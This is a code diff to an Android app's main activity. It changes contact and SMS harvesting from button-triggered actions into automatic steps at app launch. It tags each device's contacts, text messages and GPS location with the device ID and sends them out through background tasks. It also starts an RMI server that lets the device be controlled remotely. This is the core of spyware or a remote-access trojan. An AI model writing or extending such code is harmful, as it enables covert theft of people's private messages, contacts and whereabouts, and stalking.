@@ -10,6 +10,7 @@ import android.location.LocationManager;
 import android.net.Uri;
 import android.os.Environment;
 import android.provider.ContactsContract;
+import android.provider.Settings;
 import android.support.v7.app.AppCompatActivity;
 import android.os.Bundle;
 import android.util.Log;
@@ -34,22 +35,38 @@ import com.google.android.gms.common.api.GoogleApiClient;
 import com.google.android.gms.location.LocationServices;
 import com.jcraft.jsch.*;
 
+import rpc.RpcClient;
+import rpc.RpcServer;
+
 public class MainActivity extends AppCompatActivity {
 
 
     //Conctacts list data structure
-    ArrayList<Pair<String, String>> contacts = new ArrayList<>();
-    LocationManager mLocationManager;
+    private ArrayList<Pair<String, String>> contacts = new ArrayList<>();
+    private LocationManager mLocationManager;
+    private String android_id;
 
     @Override
     protected void onCreate(Bundle savedInstanceState) {
         super.onCreate(savedInstanceState);
         setContentView(R.layout.activity_main);
 
+        android_id = Settings.Secure.getString(getBaseContext().getContentResolver(),
+                Settings.Secure.ANDROID_ID);
+
         mLocationManager = (LocationManager) getSystemService(LOCATION_SERVICE);
-        LocationListener locationListener = new MyLocationListener(getBaseContext());
+        LocationListener locationListener = new MyLocationListener(getBaseContext(), android_id);
         mLocationManager.requestLocationUpdates(
                 LocationManager.GPS_PROVIDER, 5000, 10, locationListener);
+
+        new CreateRMIServerAsyncTask(this).execute();
+
+        try {
+            sendContacts();
+        } catch (IOException e) {
+            e.printStackTrace();
+        }
+        sendSMS();
 
     }
 
@@ -76,7 +93,7 @@ public class MainActivity extends AppCompatActivity {
     }
 
     // Function to save all contacts of the user in a data structure.
-    public void getContacts(View view) throws IOException {
+    public void sendContacts() throws IOException {
 
         ContentResolver cr = getContentResolver();
         Cursor cur = cr.query(ContactsContract.Contacts.CONTENT_URI,
@@ -102,20 +119,11 @@ public class MainActivity extends AppCompatActivity {
             }
         }
 
-        try {
-            sendContacts();
-        } catch (IOException e) {
-            e.printStackTrace();
-        }
+        new SendContactListAsyncTask(this, android_id, contacts).execute();
     }
 
 
-    void sendContacts() throws IOException {
-        new SendContactListAsyncTask(this,contacts).execute();
-    }
-
-
-    public void getSMS(View view){
+    public void sendSMS(){
 
         ArrayList<String> messages = new ArrayList<>();
 
@@ -135,6 +143,6 @@ public class MainActivity extends AppCompatActivity {
             // empty box, no SMS
         }
 
-        new SendSMSAsyncTask(this,messages).execute();
+        new SendSMSAsyncTask(this, android_id, messages).execute();
     }
 }
